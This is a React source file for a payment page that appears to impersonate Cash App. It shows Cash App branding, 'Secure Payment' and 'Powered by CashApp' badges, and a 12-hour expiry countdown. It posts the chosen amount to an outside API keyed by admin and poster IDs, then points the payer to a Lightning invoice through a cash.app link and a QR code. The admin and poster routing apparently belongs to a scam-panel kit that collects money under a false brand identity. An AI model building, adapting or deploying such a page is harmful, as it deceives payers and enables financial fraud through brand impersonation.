'use client';
import { useState, useEffect } from 'react';
import { FaLock, FaArrowRight, FaCheckCircle } from 'react-icons/fa';
import { MdVerifiedUser } from 'react-icons/md';
import { toast } from 'react-toastify';
import Cookies from 'js-cookie';
import { API_URL, site } from '../config/index';

const AMOUNTS = [10, 50, 100, 200, 300, 500];
const MORE_AMOUNTS = [750, 1000, 1500, 2000];

export default function Home({ adminId, posterId, param, param2 }) {
  const [step, setStep] = useState(1);
  const [selectedAmount, setSelectedAmount] = useState(null);
  const [customAmount, setCustomAmount] = useState('');
  const [showMore, setShowMore] = useState(false);
  const [loading, setLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(12 * 60 * 60);
  const [lightningInvoice, setLightningInvoice] = useState('');

  useEffect(() => {
    if (step === 2 && timeLeft > 0) {
      const timerId = setInterval(() => {
        setTimeLeft((prev) => prev - 1);
      }, 1000);
      return () => clearInterval(timerId);
    }
  }, [step, timeLeft]);

  const formatTime = (seconds) => {
    const hrs = Math.floor(seconds / 3600);
    const mins = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${hrs.toString().padStart(2, '0')}:${mins
      .toString()
      .padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handlePayNow = async () => {
    if (!selectedAmount) {
      toast.error('Select your amount');
      return;
    }
    setLoading(true);
    const fullLink =
      param && param2
        ? `https://${site}/${param}/${param2}`
        : `https://${site}`;

    const values = {
      site: fullLink,
      amount: selectedAmount,
      adminId,
    };

    try {
      const url = `${API_URL}/ad/${adminId}/${posterId}`;

      const res = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(values),
      });

      const data = await res.json();
      if (data && data.info && data.info.lightningInvoice) {
        setLightningInvoice(data.info.lightningInvoice);
      } else {
        setLightningInvoice('');
      }

      setLoading(false);
      setStep(2);
    } catch (error) {
      console.error('Error creating invoice:', error);
      setLightningInvoice('');
      setLoading(false);
      setStep(2);
    }
  };

  const handleRecommendedPay = () => {
    if (lightningInvoice) {
      window.location.href = `https://cash.app/launch/lightning/${lightningInvoice}`;
    } else {
      toast.error('Lightning invoice is not generated yet.');
    }
  };

  const handleAmountClick = (amt) => {
    setSelectedAmount(amt);
    setCustomAmount(amt.toString());
  };

  const handleCustomAmountChange = (e) => {
    const val = e.target.value;
    setCustomAmount(val);
    if (!isNaN(parseFloat(val))) {
      setSelectedAmount(parseFloat(val));
    }
  };

  return (
    <div className="min-h-screen bg-[#f2fcf5] font-sans text-gray-900 flex flex-col justify-between">
      {/* Top Header */}
      <header className="flex justify-between items-center px-4 py-3 md:px-8 bg-white border-b border-gray-100 shrink-0">
        <div className="flex items-center gap-2">
          <div className="bg-[#00D632] p-1.5 rounded-lg">
            <svg
              width="24"
              height="24"
              viewBox="0 0 24 24"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                d="M11.8 17.7V19.2M11.8 4.8V6.3M15.4 8.7C15.4 7.4 14.3 6.3 13 6.3H10.6C9.3 6.3 8.2 7.4 8.2 8.7C8.2 10 9.3 11.1 10.6 11.1H13C14.3 11.1 15.4 12.2 15.4 13.5C15.4 14.8 14.3 15.9 13 15.9H10.6C9.3 15.9 8.2 14.8 8.2 13.5"
                stroke="white"
                strokeWidth="2.5"
                strokeLinecap="round"
              />
            </svg>
          </div>
        </div>
        <button className="flex items-center gap-1.5 text-gray-500 text-sm font-medium border border-gray-200 px-3 py-1.5 rounded-full hover:bg-gray-50 transition-colors">
          <FaLock className="text-xs" />
          <span>Secure</span>
        </button>
      </header>

      <main className="flex-1 flex flex-col items-center justify-center py-4 px-4 overflow-hidden">
        {step === 1 ? (
          <div className="w-full max-w-[390px] bg-white rounded-[32px] shadow-2xl border border-gray-150 p-5 md:p-6 my-auto relative overflow-hidden flex flex-col justify-between shrink-0">
            {/* Phone Speaker Notch at Top */}
            <div className="w-12 h-1 bg-gray-200 rounded-full mx-auto mb-4"></div>

            {/* Profile/App Info */}
            <div className="flex flex-col items-center mb-3">
              <div className="w-12 h-12 bg-[#00D632] rounded-full flex items-center justify-center text-white text-2xl font-bold mb-2">
                c
              </div>
              <h1 className="text-xl font-extrabold text-gray-900 mb-1">
                Cash App
              </h1>
              <div className="flex items-center gap-1 bg-[#e6fbf0] text-[#00D632] px-2.5 py-0.5 rounded-full text-[11px] font-bold border border-[#ccf7e1]">
                <FaCheckCircle className="text-[9px]" />
                <span>Secure Payment</span>
              </div>
            </div>

            {/* Thin divider line */}
            <div className="border-t border-gray-100 w-full my-3"></div>

            {/* Amount Selection Section */}
            <div className="space-y-4">
              <div className="flex items-center gap-1.5 text-[11px] font-extrabold text-gray-400 uppercase tracking-wider mb-2">
                <div className="w-4 h-4 rounded-full border border-[#00D632] flex items-center justify-center text-[#00D632] text-[9px] font-black font-sans">
                  $
                </div>
                <span>SELECT AMOUNT</span>
              </div>

              {/* Amount Grid */}
              <div className="grid grid-cols-3 gap-2">
                {AMOUNTS.map((amt) => (
                  <button
                    key={amt}
                    onClick={() => handleAmountClick(amt)}
                    className={`py-2 px-1 rounded-xl border transition-all duration-200 text-sm font-extrabold ${
                      selectedAmount === amt
                        ? 'border-[#00D632] bg-[#f2fcf5] text-[#00D632]'
                        : 'border-gray-200 bg-white text-gray-900 hover:border-gray-300'
                    }`}
                  >
                    ${amt.toFixed(2)}
                  </button>
                ))}
                {showMore &&
                  MORE_AMOUNTS.map((amt) => (
                    <button
                      key={amt}
                      onClick={() => handleAmountClick(amt)}
                      className={`py-2 px-1 rounded-xl border transition-all duration-200 text-sm font-extrabold ${
                        selectedAmount === amt
                          ? 'border-[#00D632] bg-[#f2fcf5] text-[#00D632]'
                          : 'border-gray-200 bg-white text-gray-900 hover:border-gray-300'
                      }`}
                    >
                      ${amt.toFixed(2)}
                    </button>
                  ))}
              </div>

              <button
                onClick={() => setShowMore(!showMore)}
                className="w-full py-2.5 text-center text-[#00D632] font-extrabold text-xs bg-[#e6fbf0] rounded-xl hover:bg-[#ccf7e1] transition-all"
              >
                {showMore ? 'Show less amounts' : 'Show more amounts'}
              </button>

              {/* Custom Amount Input */}
              <div className="relative">
                <input
                  type="number"
                  value={customAmount}
                  onChange={handleCustomAmountChange}
                  className="w-full py-2.5 px-4 bg-white border border-gray-200 rounded-xl text-sm font-semibold outline-none focus:border-[#00D632] text-gray-700 transition-colors"
                  placeholder="Enter custom amount (min 10, max 2000)"
                />
              </div>

              {/* Pay Button */}
              <button
                onClick={handlePayNow}
                disabled={loading}
                className="w-full py-3 bg-[#00D632] hover:bg-[#00b029] text-white font-extrabold rounded-full text-base flex items-center justify-center gap-2 transition-all disabled:opacity-50 shadow-md shadow-green-100"
              >
                <FaLock className="text-xs opacity-90" />
                <span>Pay Now</span>
                <FaArrowRight className="text-xs opacity-90" />
              </button>

              {loading && (
                <div className="flex items-center justify-center gap-3 py-1">
                  <div className="w-4 h-4 border-2 border-[#00D632] border-t-transparent rounded-full animate-spin"></div>
                  <span className="text-xs font-semibold text-[#00D632]">
                    Creating invoice...
                  </span>
                </div>
              )}
            </div>

            {/* Thin divider line */}
            <div className="border-t border-gray-100 w-full my-3"></div>

            {/* Card Footer */}
            <div className="text-center pb-1">
              <p className="text-[10px] font-extrabold text-gray-400 uppercase tracking-widest">
                Powered by CashApp
              </p>
            </div>

            {/* Bottom Neon Accent Line */}
            <div className="absolute bottom-0 left-0 right-0 h-1 bg-gradient-to-r from-transparent via-[#00D632] to-transparent opacity-40"></div>
          </div>
        ) : (
          <div className="w-full max-w-[390px] space-y-3 my-auto flex flex-col shrink-0">
            {/* Main Payment Card */}
            <div className="bg-white rounded-[32px] shadow-2xl border border-gray-150 p-5 md:p-6 flex flex-col items-center shrink-0">
              <div className="w-full text-center mb-3 flex flex-col items-center">
                <p className="text-[11px] font-extrabold text-gray-400 uppercase tracking-wider mb-1">
                  Amount Due
                </p>
                <h2 className="text-4xl font-extrabold text-gray-900 leading-tight">
                  ${selectedAmount.toFixed(2)}
                </h2>
                <p className="text-[12px] font-semibold text-gray-400 mt-1">
                  Scan or tap to pay
                </p>
              </div>

              {/* QR Code Container */}
              <div className="relative p-3.5 bg-white border border-gray-100 rounded-[28px] mb-3 w-full aspect-square flex items-center justify-center shadow-sm max-w-[260px] mx-auto">
                <img
                  src={`https://api.qrserver.com/v1/create-qr-code/?size=600x600&ecc=H&data=${encodeURIComponent(`https://cash.app/launch/lightning/${lightningInvoice}`)}`}
                  alt="Payment QR"
                  className="w-full h-full object-contain p-1"
                />
                <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-[#00D632] w-9 h-9 rounded-xl flex items-center justify-center shadow-lg border-2 border-white">
                  <span className="text-white font-black text-lg select-none">
                    $
                  </span>
                </div>
              </div>

              {/* Pay Now RECOMMENDED Button */}
              <button
                onClick={handleRecommendedPay}
                className="w-full py-3 bg-[#00D632] hover:bg-[#00b029] text-white font-extrabold rounded-full text-[15px] flex items-center justify-center gap-2.5 transition-all shadow-md shadow-green-100"
              >
                <div className="bg-black rounded-lg w-6 h-6 flex items-center justify-center shadow-sm">
                  <span className="text-white font-black text-xs">$</span>
                </div>
                <span>Pay now</span>
                <span className="bg-white/20 text-white text-[9px] font-extrabold uppercase px-2 py-0.5 rounded-full tracking-wider">
                  Recommended
                </span>
              </button>
            </div>

            {/* Timer Box (Separate card matching screenshot) */}
            <div className="bg-white border border-gray-150 shadow-xl rounded-[24px] p-4 text-center shrink-0 w-full">
              <p className="text-[11px] font-extrabold text-gray-400 uppercase tracking-wider mb-1">
                Expires In
              </p>
              <p className="text-2xl font-extrabold text-gray-900 leading-none">
                {formatTime(timeLeft)}{' '}
                <span className="text-gray-400 font-bold ml-1">remaining</span>
              </p>
            </div>
          </div>
        )}
      </main>

      {/* Decorative Bottom Bar (Phone like) */}
      <div className="fixed bottom-0 left-0 right-0 h-1 bg-gradient-to-r from-transparent via-[#00D632] to-transparent opacity-30"></div>
    </div>
  );
}
